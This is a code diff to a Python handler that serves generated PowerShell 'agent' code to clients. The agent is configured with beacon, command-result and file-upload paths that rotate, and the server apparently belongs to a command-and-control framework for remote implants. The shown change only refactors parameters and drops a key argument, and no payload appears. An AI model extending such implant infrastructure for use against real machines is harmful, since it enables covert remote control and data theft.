@@ -6,18 +6,16 @@ class AgentHandler(BaseHandler):
     
     def handle_agent_request(self):
         """Send PowerShell agent code to client"""
-        # Get the key as base64
-        key_base64 = self.crypto_helper.crypto_manager.get_key_base64()
+        # Get the server address
         server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
         
         # Get current paths and rotation info
         current_paths = self.path_router.get_current_paths()
         rotation_info = self.path_router.get_rotation_info()
         
-        # Generate the agent code
+        # Generate the agent code - with updated parameter passing matching the new signature
         agent_code = generate_agent_code(
-            key_base64, 
-            server_address, 
+            server_address=server_address, 
             beacon_path=current_paths["beacon_path"],
             cmd_result_path=current_paths["cmd_result_path"],
             file_upload_path=current_paths["file_upload_path"],
